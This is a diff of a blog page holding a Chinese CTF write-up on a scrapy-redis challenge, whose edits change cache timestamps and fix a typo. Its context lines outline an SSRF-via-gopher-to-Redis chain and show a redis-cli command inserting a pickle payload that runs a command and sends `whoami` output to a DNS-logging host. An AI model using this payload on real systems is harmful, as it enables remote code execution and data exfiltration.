@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>blacknut</title>
 <meta name="description" content="" />
-<link rel="shortcut icon" href="https://ablacknut.github.io/favicon.ico?v=1605455447839">
+<link rel="shortcut icon" href="https://ablacknut.github.io/favicon.ico?v=1605502545813">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
@@ -23,7 +23,7 @@
       <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
         <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
         <a href="https://ablacknut.github.io">
-          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://ablacknut.github.io/images/avatar.png?v=1605455447839" alt="">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://ablacknut.github.io/images/avatar.png?v=1605502545813" alt="">
         </a>
         <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">blacknut</h1>
       </div>
@@ -417,7 +417,7 @@ p_str = pickle.dumps(data)
 <li>搞明白这么多，我们再来看题目</li>
 <li>首先爬虫里，会提取首页面的地址，并访问保存内容。而且没有限制。如果里面有一个链接指向了本地文件，那就可以本地文件泄露了</li>
 <li>srapy_redis 里面的 <code>bytectf:requests</code>，里面保存了pickle反序列后的request对象，如果可以往这里面加一个代码执行payload的反序列字符串，那就可以执行命令了。</li>
-<li>scrapy不支持<code>gopher</code>协议。但是题目中有一个result页面，可以无回显sstf，使用的是pycurl，支持<code>gopher</code>协议。</li>
+<li>scrapy不支持<code>gopher</code>协议。但是题目中有一个result页面，可以无回显ssrf，使用的是pycurl，支持<code>gopher</code>协议。</li>
 </ul>
 <h2 id="预期解思路">预期解思路</h2>
 <ol>
@@ -429,7 +429,7 @@ p_str = pickle.dumps(data)
 </ol>
 <h2 id="佛系复现">佛系复现</h2>
 <ul>
-<li>因为没有web界面了，也没办法利用ssrf，就不用构造gopher+ssrf的payload了(这个应该不难)，那我们就手动进入redis容器，执行：<br>
+<li>因为没有web界面了，也没办法利用ssrf，就不用构造gopher+ssrf+redis的payload了(这个应该不难)，那我们就手动进入redis容器，执行：<br>
 <code>shell redis-cli 127.0.0.1:6379&gt; zadd byte:requests 0 &quot;cos\nsystem\n(Vping `whoami`.ip.port.hembie.ceye.io\ntR.&quot; (integer) 1</code></li>
 <li>出来我们查看以下scrapy容器日志，<code>docker log 容器ID</code>：<br>
 <img src="https://ablacknut.github.io/post-images/1605451874569.jpg" alt="" loading="lazy"><br>
